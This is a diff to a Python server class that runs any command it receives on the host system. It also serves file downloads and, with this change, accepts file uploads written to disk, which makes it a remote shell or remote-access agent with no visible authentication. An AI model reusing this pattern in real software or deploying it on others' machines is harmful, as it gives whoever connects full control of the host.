@@ -25,11 +25,19 @@ class Server:
     def read_file(self, path):
         with open(path, "rb") as file:
             data = file.read().decode("utf-8")
+            file.close()
             return data
 
     def change_directory(self, path):
         os.chdir(path)
         return f"Changed directory to {self.execute_command_on_system('pwd')}."
+
+    def write_file(self, file_path, data):
+        file_name = os.path.basename(file_path)
+        with open(file_name, "wb") as file:
+            file.write(data.encode())
+            file.close()
+            return f"File saved {file_name}"
 
     def receive_commands_and_execute(self):
         sending_data = ""
@@ -46,6 +54,10 @@ class Server:
                 elif split_command[0] == "download" and split_command[1] is not None:
                     file = self.read_file(split_command[1])
                     sending_data = file
+                elif split_command[0] == "upload" and split_command[1] is not None:
+                    self.write_file(split_command[1], split_command[2])
+                    print("demon", split_command[2])
+                    sending_data = f"FIle uploaded at {split_command[1]}"
                 else:
                     result = self.execute_command_on_system(receive)
                     sending_data = result
